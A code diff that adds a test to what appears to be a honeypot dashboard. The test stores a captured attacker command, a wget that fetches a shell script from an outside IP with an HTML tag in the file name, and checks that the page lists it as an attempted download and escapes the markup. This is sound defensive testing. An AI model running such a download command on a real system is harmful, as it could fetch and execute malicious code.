@@ -556,3 +556,17 @@ def test_metrics_report_zero_for_an_empty_database(tmp_path):
     body = _client(make_session_factory(engine)).get("/metrics").get_data(as_text=True)
     assert "surya_kundal_sessions 0" in body
     assert "surya_kundal_last_session_timestamp_seconds 0" in body
+
+
+def test_session_page_shows_attempted_downloads_escaped(factory):
+    from surya_kundal.database.models import Command
+
+    with factory() as db:
+        db.add(
+            Command(session_id=SESSION_A, command="wget http://45.33.32.156/<b>.sh", timestamp=NOW)
+        )
+        db.commit()
+        map_pending(db)
+    body = _client(factory).get(f"/sessions/{SESSION_A}").get_data(as_text=True)
+    assert "Attempted downloads" in body and "45.33.32.156" in body
+    assert "<b>" not in body
